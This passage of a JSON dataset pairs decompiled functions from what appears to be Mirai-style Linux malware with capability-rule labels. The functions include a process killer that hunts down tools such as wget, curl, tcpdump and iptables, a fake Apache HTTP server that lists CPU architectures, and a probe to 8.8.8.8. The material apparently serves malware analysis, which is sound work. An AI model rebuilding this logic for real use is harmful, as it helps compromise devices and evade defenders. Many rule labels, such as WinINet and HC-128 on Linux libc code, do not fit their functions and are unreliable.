arg2_00 = arg2_00 + 1;\n    } while (uVar1 != 0);\n    for (; *arg2_00 != 0; arg2_00 = arg2_00 + 2) {\n        if (*arg2_00 < 0xf) {\n            pcStack304 = 0x40a7c4;\n            fcn.00408190(&stack0xfffffffffffffed8 + *arg2_00 * 0x10, arg2_00, 0x10);\n        }\n    }\n    pcStack304 = 0x40a7d6;\n    fcn.0040be10(&stack0xfffffffffffffed8);\n    pcStack304 = 0x40a7db;\n    fcn.0040a6e7();\n    arg3_00 = 0x1000;\n    if (iStack192 == 0) {\n        iStack192 = 0x1000;\n    }\n    *0x511588 = iStack192;\n    if (iStack112 == -1) {\n        pcStack304 = 0x40a803;\n        iVar2 = fcn.0040ad08();\n        pcStack304 = 0x40a80a;\n        iVar3 = fcn.0040ac7c();\n        arg3_00 = extraout_RDX;\n        if (iVar2 == iVar3) {\n            pcStack304 = 0x40a813;\n            iVar2 = fcn.0040aca4();\n            pcStack304 = 0x40a81a;\n            iVar3 = fcn.0040ac54();\n            arg3_00 = extraout_RDX_00;\n            if (iVar2 == iVar3) goto code_r0x0040a81e;\n        }\n    }\n    else {\ncode_r0x0040a81e:\n        if ((iStack112 == -1) || ((iStack112 == iStack96 && (iStack80 == iStack64)))) goto code_r0x0040a872;\n    }\n    pcStack304 = 0x40a854;\n    fcn.0040a6b2(0, 0x20000, arg3_00);\n    pcStack304 = 0x40a863;\n    fcn.0040a6b2(1, 0x20002, arg3_01);\n    pcStack304 = 0x40a872;\n    fcn.0040a6b2(2, 0x20002, arg3_02);\ncode_r0x0040a872:\n    *0x50f468 = *arg3;\n    *0x511590 = arg5;\n    if (arg4 != NULL) {\n        pcStack304 = 0x40a8af;\n        (*arg4)();\n    }\n    pcStack304 = 0x40a8e1;\n    puVar5 = fcn.00406f98();\n    *puVar5 = 0;\n    pcStack304 = 0x40a90c;\n    ppuVar6 = arg3;\n    uVar4 = (*arg1)(arg2, arg3, *0x511580);\n    pcStack304 = 0x40a913;\n    fcn.0040a1b8(uVar4);\n    syscall();\n    uStack320 = 0;\n    uStack328 = 0;\n    ppuStack312 = arg3;\n    pcStack304 = arg4;\n    if (ppuVar6 != NULL) {\n        puStack496 = *ppuVar6;\n        fcn.00408190(&stack0xfffffffffffffe28, ppuVar6 + 1, 0x80);\n        uStack480 = 0x40a914;\n        iStack488 = *(ppuVar6 + 0x11) | 0x4000000;\n    }\n    syscall();\n    if (extraout_RDX_01 != NULL) {\n        *extraout_RDX_01 = uStack656;\n        fcn.00408190(extraout_RDX_01 + 1, &stack0xfffffffffffffd88, 0x80);\n        *(extraout_RDX_01 + 0x11) = uStack648;\n        extraout_RDX_01[0x12] = uStack640;\n    }\n    return 0xd;\n}\n",
        "token_count": 1432
    },
    "0040ae0c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuchar  [16] fcn.0040ae0c(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    ulong uStack24;\n    \n    if (((*0x5115b0 == 0) && (iVar1 = fcn.0040be28(0),  iVar1 < 0)) ||\n       ((iVar2 = *0x5115b0,  arg1 != 0 && (iVar1 = fcn.0040be28(*0x5115b0 + arg1),  iVar1 < 0)))) {\n        iVar2 = -1;\n    }\n    return CONCAT88(uStack24, iVar2);\n}\n",
        "token_count": 150
    },
    "0040ae58": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040ae9a)\n\nulong fcn.0040ae58(ulong arg1, int64_t arg2, ulong arg3)\n\n{\n    uint *puVar1;\n    ulong uVar2;\n    \n    if (arg1 < 3 || arg2 == 0) {\n        syscall();\n        uVar2 = 0xe;\n    }\n    else {\n        puVar1 = fcn.00406f98();\n        *puVar1 = 0x16;\n        uVar2 = 0xffffffff;\n    }\n    return uVar2;\n}\n",
        "token_count": 131
    },
    "0040b010": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.0040b010(uint16_t *arg1, char *arg2, uint64_t arg3)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    char *pcVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    \n    uVar5 = arg3;\n    while( true ) {\n        if (uVar5 == 0) {\n            return arg3;\n        }\n        iVar2 = fcn.00406c1c(*(arg1 + 2));\n        if (iVar2 < 0) break;\n        uVar5 = uVar5 - iVar2;\n        arg2 = arg2 + iVar2;\n    }\n    pcVar4 = *(arg1 + 4);\n    *arg1 = *arg1 | 8;\n    uVar3 = *(arg1 + 8) - pcVar4;\n    if (uVar3 != 0) {\n        uVar6 = uVar5;\n        if (uVar3 <= uVar5) {\n            uVar6 = uVar3;\n        }\n        while ((cVar1 = *arg2,  *pcVar4 = cVar1,  cVar1 != '\\n' || ((*(arg1 + 1) & 1) == 0))) {\n            pcVar4 = pcVar4 + 1;\n            uVar6 = uVar6 - 1;\n            if (uVar6 == 0) break;\n            arg2 = arg2 + 1;\n        }\n        *(arg1 + 0xc) = pcVar4;\n        uVar5 = uVar5 - (pcVar4 - *(arg1 + 4));\n    }\n    return arg3 - uVar5;\n}\n",
        "token_count": 387
    },
    "0040b1a8": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0040b1a8(uint32_t *arg1, ulong arg2)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    ulong uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    \n    uVar2 = *arg1;\n    if ((arg2 & uVar2 & 0xffff) == 0) {\n        if ((uVar2 & 0x880) == 0) {\n            *arg1 = uVar2 | arg2;\n            goto code_r0x0040b1c2;\n        }\n    }\n    else {\ncode_r0x0040b1c2:\n        uVar1 = *arg1;\n        if ((uVar1 & 0x20) == 0) {\n            if ((uVar1 & 3) == 0) {\ncode_r0x0040b222:\n                *arg1 = *arg1 | 0x40;\n                if ((*arg1 & 0xb00) != 0) {\n                    return 0;\n                }\n                *(arg1 + 0xc) = *(arg1 + 4);\n                return 0;\n            }\n            if (((uVar1 & 4) != 0) ||\n               (((*(arg1 + 8) == *(arg1 + 6) && ((uVar1 & 2) == 0)) ||\n                (iVar4 = fcn.0040be6c(arg1, 0, 2 - ((uVar1 & 0x400) == 0)),  iVar4 == 0)))) {\n                uVar3 = *(arg1 + 2);\n                *arg1 = *arg1 & 0xfffc;\n                *(arg1 + 10) = uVar3;\n                *(arg1 + 6) = uVar3;\n                *(arg1 + 8) = uVar3;\n                goto code_r0x0040b222;\n            }\n            goto code_r0x0040b1d4;\n        }\n    }\n    puVar5 = fcn.00406f98();\n    *puVar5 = 9;\ncode_r0x0040b1d4:\n    *arg1 = *arg1 | 8;\n    return 0xffffffff;\n}\n",
        "token_count": 496
    },
    "0040bd0c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0040bd0c(ulong arg1, int64_t arg2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint64_t arg2_00;\n    ulong var_8h;\n    ulong auStack344 [20];\n    int64_t iStack184;\n    ulong auStack176 [16];\n    uint32_t uStack48;\n    \n    arg2_00 = arg1;\n    if ((arg2 == -1 || arg1 < 1) || (0x40 < arg1)) {\n        puVar1 = fcn.00406f98();\n        *puVar1 = 0x16;\n    }\n    else {\n        iVar2 = 0x10;\n        while (iVar2 = iVar2 + -1,  -1 < iVar2) {\n            auStack176[iVar2] = 0;\n        }\n        iStack184 = arg2;\n        iVar2 = fcn.0040bdd4(auStack176, arg2_00);\n        if (-1 < iVar2) {\n            iVar2 = fcn.0040bdb4(0x511f60, arg2_00);\n            uStack48 = -(iVar2 == 0) & 0x10000000;\n            iVar2 = fcn.0040a91d(arg2_00, &iStack184, auStack344);\n            if (-1 < iVar2) {\n                return auStack344[0];\n            }\n        }\n    }\n    return 0xffffffffffffffff;\n}\n",
        "token_count": 328
    },
    "0040be6c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong fcn.0040be6c(uint16_t *arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    uchar auStack88 [40];\n    ulong auStack48 [2];\n    \n    auStack48[0] = arg2;\n    if (arg3 < 3) {\n        iVar1 = *(arg1 + 0x28);\n        if (iVar1 == 0) {\n            fcn.0040a6b1(auStack88, fcn.0040a6ae, arg1 + 0x2c);\n            fcn.0040a6ae(arg1 + 0x2c);\n        }\n        if (((((*arg1 & 0x40) == 0) || (iVar5 = fcn.004072f8(arg1),  iVar5 == 0)) &&\n            ((arg3 != 1 || (iVar3 = fcn.0040bf50(arg1, auStack48),  -1 < iVar3)))) &&\n           (iVar3 = fcn.0040bfd8(arg1, auStack48),  -1 < iVar3)) {\n            *arg1 = *arg1 & 0xffb8;\n            uVar2 = *(arg1 + 4);\n            uVar6 = 0;\n            *(arg1 + 0x24) = 0;\n            *(arg1 + 1) = 0;\n            *(arg1 + 0xc) = uVar2;\n            *(arg1 + 0x10) = uVar2;\n            *(arg1 + 0x14) = uVar2;\n            *(arg1 + 0x18) = uVar2;\n        }\n        else {\n            uVar6 = 0xffffffff;\n        }\n        if (iVar1 == 0) {\n            fcn.0040a6b1(auStack88, 1);\n        }\n        return uVar6;\n    }\n    puVar4 = fcn.00406f98();\n    *puVar4 = 0x16;\n    return 0xffffffff;\n}\n",
        "token_count": 485
    },
    "0040bf50": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0040bf50(uint32_t *arg1, int64_t *arg2)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    \n    uVar1 = *arg1;\n    iVar5 = 0;\n    if ((((uVar1 & 3) != 0) && (iVar5 = (uVar1 & 3) - 1,  iVar5 != 0)) && ((uVar1 & 0x800) != 0)) {\n        if ((1 < iVar5) || (arg1[0x11] != 0)) {\n            return -1;\n        }\n        iVar5 = (iVar5 - *(arg1 + 3)) + -1;\n        if (0 < arg1[0x12]) {\n            iVar5 = iVar5 - *(arg1 + 2);\n        }\n    }\n    if ((uVar1 & 0x40) == 0) {\n        iVar3 = *(arg1 + 8);\n    }\n    else {\n        iVar3 = *(arg1 + 2);\n    }\n    iVar2 = *arg2;\n    iVar5 = iVar5 + (iVar3 - arg1[6]);\n    iVar6 = iVar2 - iVar5;\n    *arg2 = iVar6;\n    if (iVar2 < iVar6) {\n        iVar5 = -iVar5;\n    }\n    if (iVar5 < 0) {\n        puVar4 = fcn.00406f98();\n        *puVar4 = 0x4b;\n    }\n    return iVar5;\n}\n",
        "token_count": 370
    },
    "004001c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.004001c0(uint64_t arg1, ulong arg2, ulong arg3, ulong arg4, ulong arg5, ulong arg6)\n\n{\n    char cVar1;\n    code **ppcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int64_t *piVar5;\n    \n    iVar3 = fcn.00406950();\n    if (iVar3 == -1 || 0 < iVar3) {\n        return;\n    }\n    iVar3 = fcn.00406950();\n    if (iVar3 != -1) {\n        if (iVar3 != 0) goto code_r0x00400261;\n        fcn.0040a334(arg1 & 0xffffffff);\n        uVar4 = fcn.004069a0();\n        fcn.00406a30(uVar4, 9);\n    }\ncode_r0x0040025a:\n    do {\n        do {\n            fcn.0040a1b8(0);\ncode_r0x00400261:\n        } while (*0x50f4d0 == 0);\n        uVar4 = 0;\n        ppcVar2 = **0x50f4d8;\n        cVar1 = *(ppcVar2 + 1);\n        piVar5 = *0x50f4d8;\n        while (arg2 != cVar1) {\n            uVar4 = uVar4 + 1;\n            if (uVar4 == *0x50f4d0) goto code_r0x0040025a;\n            ppcVar2 = piVar5[1];\n            piVar5 = piVar5 + 1;\n            cVar1 = *(ppcVar2 + 1);\n        }\n        (**ppcVar2)(arg3, arg4, arg5);\n    } while( true );\n}\n",
        "token_count": 405
    },
    "00403430": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00403430(ulong arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    ulong noname_0;\n    int64_t iVar4;\n    ulong in_RCX;\n    ulong in_R8;\n    ulong in_R9;\n    uint64_t arg1_00;\n    int64_t arg3;\n    uchar auVar5 [16];\n    ulong uStack1232;\n    ulong var_4c0h;\n    uchar auStack1216 [1016];\n    ulong var_c0h;\n    ulong var_90h;\n    ulong var_28h;\n    \n    arg1_00 = arg1;\n    uStack1232 = 0x403452;\n    noname_0 = fcn.004033c0(arg2);\n    uStack1232 = 0x403464;\n    iVar2 = fcn.00406ba4(noname_0, &fcn.00403430::var_c0h);\n    if (iVar2 < 0) {\n        uStack1232 = 0x4035b6;\n        fcn.00405cf0(\"HTTP/1.1 404 Not Found\");\n        uStack1232 = 0x4035c6;\n        fcn.00406c1c(arg1_00);\n        uStack1232 = 0x4035d8;\n        fcn.00406c1c(arg1_00);\n        uStack1232 = 0x4035e2;\n        fcn.00405cf0(\"Server: Apache\");\n        uStack1232 = 0x4035f2;\n        fcn.00406c1c(arg1_00);\n        uStack1232 = 0x403604;\n        fcn.00406c1c(arg1_00);\n        uStack1232 = 0x40360e;\n        fcn.00405cf0(\"Content-Length: \");\n        uStack1232 = 0x40361e;\n        fcn.00406c1c(arg1_00);\n        uStack1232 = 0x403633;\n        fcn.00407094(&fcn.00403430::var_4c0h, \" %d\\n\\r\\n\", var_90h, in_RCX, in_R8, in_R9);\n        uStack1232 = 0x40363b;\n        fcn.00405cf0(&fcn.00403430::var_4c0h);\n        uStack1232 = 0x403649;\n        fcn.00406c1c(arg1_00);\n        uStack1232 = 0x403658;\n        fcn.00408200(&fcn.00403430::var_4c0h, 0, 0x400);\n    }\n    else {\n        uStack1232 = 0x403482;\n        fcn.00408200(&fcn.00403430::var_4c0h, 0, 0x400);\n        uStack1232 = 0x40348c;\n        fcn.00405cf0(\"HTTP/1.1 200 OK\");\n        uStack1232 = 0x40349c;\n        fcn.00406c1c(arg1_00);\n        uStack1232 = 0x4034ae;\n        fcn.00406c1c(arg1);\n        uStack1232 = 0x4034b8;\n        fcn.00405cf0(\"Server: Apache\");\n        uStack1232 = 0x4034c8;\n        fcn.00406c1c(arg1_00);\n        uStack1232 = 0x4034da;\n        fcn.00406c1c(arg1_00);\n        uStack1232 = 0x4034e4;\n        fcn.00405cf0(\"Content-Length: \");\n        uStack1232 = 0x4034f4;\n        fcn.00406c1c(arg1_00);\n        uStack1232 = 0x403509;\n        fcn.00407094(&fcn.00403430::var_4c0h, \" %d\\n\\r\\n\", var_90h, in_RCX, in_R8, in_R9);\n        uStack1232 = 0x403511;\n        fcn.00405cf0(&fcn.00403430::var_4c0h);\n        uStack1232 = 0x40351f;\n        fcn.00406c1c(arg1_00);\n        uStack1232 = 0x40352e;\n        fcn.00408200(&fcn.00403430::var_4c0h, 0, 0x400);\n        arg3 = var_90h;\n        iVar1 = -(arg3 + 0x1eU & 0xfffffffffffffff0);\n        *(&stack0xfffffffffffffb30 + iVar1) = 0x403556;\n        fcn.00408200(&stack0xfffffffffffffb40 + iVar1, 0, arg3);\n        *(&stack0xfffffffffffffb30 + iVar1) = 0x40355e;\n        auVar5 = fcn.004033c0(arg2);\n        *(&stack0xfffffffffffffb30 + iVar1) = 0x40356a;\n        uVar3 = fcn.00406a5c(SUB168(auVar5, 0), 0, SUB168(auVar5 >> 0x40, 0));\n        if (uVar3 != 0xffffffff) {\n            *(&stack0xfffffffffffffb30 + iVar1) = 0x403580;\n            iVar4 = fcn.00406b00(uVar3);\n            if (iVar4 == var_90h) {\n                *(&stack0xfffffffffffffb30 + iVar1) = 0x403668;\n                fcn.00406c1c(arg1_00);\n                *(&stack0xfffffffffffffb30 + iVar1) = 0x403675;\n                fcn.00408200(&stack0xfffffffffffffb40 + iVar1, 0, arg3);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 1385
    },
    "00403680": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00403680(ulong arg1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *in_RCX;\n    ulong extraout_RDX;\n    ulong extraout_RDX_00;\n    ulong noname_2;\n    ulong noname_2_00;\n    ulong noname_2_01;\n    ulong noname_2_02;\n    ulong noname_2_03;\n    ulong noname_2_04;\n    ulong noname_2_05;\n    ulong noname_2_06;\n    uint64_t arg1_00;\n    uchar auStack1096 [1024];\n    ushort uStack72;\n    uint16_t uStack70;\n    uint uStack68;\n    uint32_t uStack48;\n    uint uStack44;\n    \n    uStack48 = 0x10;\n    iVar1 = fcn.00406950();\n    if (iVar1 == 0) {\n        uStack72 = 2;\n        uStack68 = 0;\n        uStack70 = arg1 >> 8 | arg1 << 8;\n        uVar2 = fcn.00408898(2, 1, 0);\n        if (uVar2 == 0xffffffff) goto code_r0x0040378d;\n        in_RCX = &uStack44;\n        uStack44 = 1;\n        iVar1 = fcn.00408860(uVar2, 1, 2, in_RCX, 4);\n        if (((-1 < iVar1) && (iVar1 = fcn.00408704(uVar2, &uStack72, uStack48),  iVar1 == 0)) &&\n           (iVar1 = fcn.004087bc(uVar2, 5),  noname_2 = extraout_RDX,  iVar1 == 0)) goto code_r0x00403794;\n        do {\n            fcn.00406924(uVar2);\ncode_r0x0040378d:\n            fcn.004068f8(0);\n            noname_2 = extraout_RDX_00;\ncode_r0x00403794:\n            fcn.00405e50(0x40cb47, 0, noname_2, in_RCX);\n            fcn.00405e50(\"arm7\", 0, noname_2_00, in_RCX);\n            fcn.00405e50(\"mips\", 0, noname_2_01, in_RCX);\n            fcn.00405e50(\"mipsel\", 0, noname_2_02, in_RCX);\n            fcn.00405e50(\"x86_64\", 0, noname_2_03, in_RCX);\n            fcn.00405e50(0x40cb63, 0, noname_2_04, in_RCX);\n            fcn.00405e50(0x40cb67, 0, noname_2_05, in_RCX);\n            fcn.00405e50(\"m68k\", 0, noname_2_06, in_RCX);\n            while( true ) {\n                uVar3 = fcn.004086d8(uVar2);\n                arg1_00 = uVar3;\n                if (uVar3 == 0xffffffff) break;\n                fcn.00408200(auStack1096, 0, 0x400);\n                in_RCX = NULL;\n                iVar1 = fcn.004087e8(arg1_00, auStack1096, 0x400, 0);\n                if (0 < iVar1) {\n                    fcn.00403430(arg1_00, auStack1096);\n                    fcn.00408200(auStack1096, 0, 0x400);\n                }\n                fcn.00406924(arg1_00);\n            }\n        } while( true );\n    }\n    *0x50f050 = iVar1;\n    return;\n}\n",
        "token_count": 882
    },
    "00404460": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00404460(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int64_t arg1;\n    int64_t iVar3;\n    ulong in_R8;\n    ulong in_R9;\n    uint32_t unaff_R12D;\n    uchar auStack4168 [4096];\n    uchar auStack72 [32];\n    \n    *0x51160c = fcn.00406950();\n    if (*0x51160c != 0) {\n        return;\n    }\n    do {\n        arg1 = fcn.00406e14(\"/proc/\");\n        if (arg1 == 0) {\n            fcn.0040a1b8(1);\n            goto code_r0x0040459d;\n        }\ncode_r0x004044e0:\n        iVar3 = fcn.00406f08(arg1);\n        if (iVar3 != 0) {\n            if (*(iVar3 + 0x13) - 0x30U < 10) {\n                unaff_R12D = fcn.0040a040(iVar3 + 0x13, 0, 10);\n                uVar1 = fcn.004069a0();\n                if ((unaff_R12D != uVar1) && (uVar1 = fcn.00406978(),  unaff_R12D != uVar1)) {\n                    fcn.00407008(auStack72, 0x20, \"/proc/%d/exe\", unaff_R12D, in_R8, in_R9);\n                    iVar2 = fcn.00406b28(auStack72, auStack4168, 0xfff);\n                    if (iVar2 != -1) {\n                        auStack4168[iVar2] = 0;\n                        iVar3 = fcn.00408494(auStack4168, \"wget\");\n                        if (iVar3 == 0) {\ncode_r0x0040459d:\n                            iVar3 = fcn.00408494(auStack4168, \"curl\");\n                            if (((((((iVar3 == 0) && (iVar3 = fcn.00408494(auStack4168, \"ping\"),  iVar3 == 0)) &&\n                                   (iVar3 = fcn.00408494(auStack4168, 0x40cc55),  iVar3 == 0)) &&\n                                  ((iVar3 = fcn.00408494(auStack4168, \"wireshark\"),  iVar3 == 0 &&\n                                   (iVar3 = fcn.00408494(auStack4168, \"tcpdump\"),  iVar3 == 0)))) &&\n                                 ((iVar3 = fcn.00408494(auStack4168, \"python\"),  iVar3 == 0 &&\n                                  ((iVar3 = fcn.00408494(auStack4168, 0x40ccd6),  iVar3 == 0 &&\n                                   (iVar3 = fcn.00408494(auStack4168, \"iptables\"),  iVar3 == 0)))))) &&\n                                (iVar3 = fcn.00408494(auStack4168, \"nano\"),  iVar3 == 0)) &&\n                               (((((iVar3 = fcn.00408494(auStack4168, \"nvim\"),  iVar3 == 0 &&\n                                   (iVar3 = fcn.00408494(auStack4168, \"vim\"),  iVar3 == 0)) &&\n                                  (iVar3 = fcn.00408494(auStack4168, 0x40cc85),  iVar3 == 0)) &&\n                                 (((iVar3 = fcn.00408494(auStack4168, 0x40cc89),  iVar3 == 0 &&\n                                   (iVar3 = fcn.00408494(auStack4168, \"/proc\"),  iVar3 == 0)) &&\n                                  ((iVar3 = fcn.00408494(auStack4168, 0x40cb7f),  iVar3 == 0 &&\n                                   ((iVar3 = fcn.00408494(auStack4168, \"/proc/net/tcp\"),  iVar3 == 0 &&\n                                    (iVar3 = fcn.00408494(auStack4168, \"mkdir\"),  iVar3 == 0)))))))) &&\n                                ((iVar3 = fcn.00408494(auStack4168, \"HTTP\"),  iVar3 == 0 &&\n                                 (iVar3 = fcn.00408494(auStack4168, 0x40ccac),  iVar3 == 0)))))) goto code_r0x004044e0;\n                        }\n                        fcn.00406a30(unaff_R12D, 9);\n                    }\n                }\n            }\n            goto code_r0x004044e0;\n        }\n        fcn.00406da0(arg1);\n        fcn.0040a634(100000);\n    } while( true );\n}\n",
        "token_count": 1062
    },
    "00405dd0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00405dd0(void)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    ushort uStack56;\n    ushort uStack54;\n    uint uStack52;\n    uint uStack28;\n    \n    uStack28 = 0x10;\n    puVar2 = fcn.00406f98();\n    *puVar2 = 0;\n    uVar1 = fcn.00408898(2, 2, 0);\n    uStack52 = 0;\n    if (uVar1 != 0xffffffff) {\n        uStack56 = 2;\n        uStack52 = 0x8080808;\n        uStack54 = 0x3500;\n        fcn.00408730(uVar1, &uStack56, 0x10);\n        fcn.0040875c(uVar1);\n        fcn.00406924(uVar1);\n    }\n    return uStack52;\n}\n",
        "token_count": 208
    },
    "00406da0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.00406da0(uint32_t *arg1)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    ulong uVar3;\n    uchar auStack56 [32];\n    \n    if (*arg1 == 0xffffffff) {\n        puVar2 = fcn.00406f98();\n        *puVar2 = 9;\n        uVar3 = 0xffffffff;\n    }\n    else {\n        fcn.0040a6b1(auStack56, fcn.0040a6ae, arg1 + 0xc);\n        fcn.0040a6ae(arg1 + 0xc);\n        uVar1 = *arg1;\n        *arg1 = 0xffffffff;\n        fcn.0040a6b1(auStack56, 1);\n        fcn.00409817(*(arg1 + 6));\n        fcn.00409817(arg1);\n        uVar3 = fcn.00406924(uVar1);\n    }\n    return uVar3;\n}\n",
        "token_count": 225
    },
    "00409817": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid fcn.00409817(ulong *arg1)\n\n{\n    ulong *puVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    ulong *puVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    ulong *puVar8;\n    uint64_t uVar9;\n    uchar auVar10 [16];\n    uchar auStack40 [32];\n    \n    if (arg1 == NULL) {\n        return;\n    }\n    fcn.0040a6b1(auStack40, fcn.0040a6ae, 0x50f2c0);\n    fcn.0040a6ae(0x50f2c0);\n    uVar4 = arg1[-1];\n    puVar8 = arg1 + -2;\n    uVar7 = uVar4 & 0xfffffffffffffffc;\n    if (uVar7 <= *0x511880) {\n        *0x511880 = *0x511880 | 3;\n        iVar2 = (((uVar4 & 0xfffffffc) >> 3) - 2) * 8;\n        *arg1 = *(iVar2 + 0x511888);\n        *(iVar2 + 0x511888) = puVar8;\n        goto code_r0x004099c8;\n    }\n    if ((uVar4 & 2) != 0) {\n        *0x511f18 = *0x511f18 + -1;\n        *0x511f30 = *0x511f30 - (uVar7 + arg1[-2]);\n        fcn.0040ad94(puVar8 - arg1[-2]);\n        goto code_r0x004099c8;\n    }\n    *0x511880 = *0x511880 | 1;\n    puVar1 = puVar8 + uVar7;\n    uVar4 = puVar1[1];\n    if ((*(arg1 + -1) & 1) == 0) {\n        uVar9 = arg1[-2];\n        puVar5 = puVar8 - uVar9;\n        iVar2 = puVar5[2];\n        iVar6 = puVar5[3];\n        puVar8 = *(iVar2 + 0x18);\n        if ((puVar8 == puVar5) && (*(iVar6 + 0x10) == puVar8)) {\n            uVar7 = uVar7 + uVar9;\n            *(iVar2 + 0x18) = iVar6;\n            *(iVar6 + 0x10) = iVar2;\n            goto code_r0x004098d9;\n        }\ncode_r0x00409910:\n        auVar10 = fcn.004099f8();\ncode_r0x00409915:\n        *(iVar6 + 0x18) = SUB168(auVar10, 0);\n        *(SUB168(auVar10, 0) + 0x10) = iVar6;\n        uVar7 = SUB168(auVar10 >> 0x40, 0) + uVar9;\ncode_r0x00409920:\n        puVar8[3] = 0x5118f0;\n        *(puVar8 + uVar7) = uVar7;\n        puVar8[2] = *0x511900;\n        (*0x511900)[3] = puVar8;\n        *0x511900 = puVar8;\n        puVar8[1] = uVar7 | 1;\n    }\n    else {\ncode_r0x004098d9:\n        uVar9 = uVar4 & 0xfffffffffffffffc;\n        if (puVar1 != *0x5118e0) {\n            uVar3 = *(puVar1 + uVar9 + 8);\n            puVar1[1] = uVar9;\n            if ((uVar3 & 1) == 0) {\n                iVar6 = puVar1[2];\n                auVar10 = CONCAT88(uVar7, puVar1[3]);\n                if ((*(iVar6 + 0x18) != puVar1) || (*(puVar1[3] + 0x10) != *(iVar6 + 0x18))) goto code_r0x00409910;\n                goto code_r0x00409915;\n            }\n            goto code_r0x00409920;\n        }\n        uVar7 = uVar7 + uVar9;\n        puVar8[1] = uVar7 | 1;\n        *0x5118e0 = puVar8;\n    }\n    if (0x1ffff < uVar7) {\n        if ((*0x511880 & 2) != 0) {\n            fcn.0040967d(0x511880);\n        }\n        if (*0x511f00 <= ((*0x5118e0)[1] & 0xfffffffffffffffc)) {\n            fcn.004095e4(*0x511f08, 0x511880);\n        }\n    }\ncode_r0x004099c8:\n    fcn.0040a6b1(auStack40, 1);\n    return;\n}\n",
        "token_count": 1137
    },
    "00408200": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
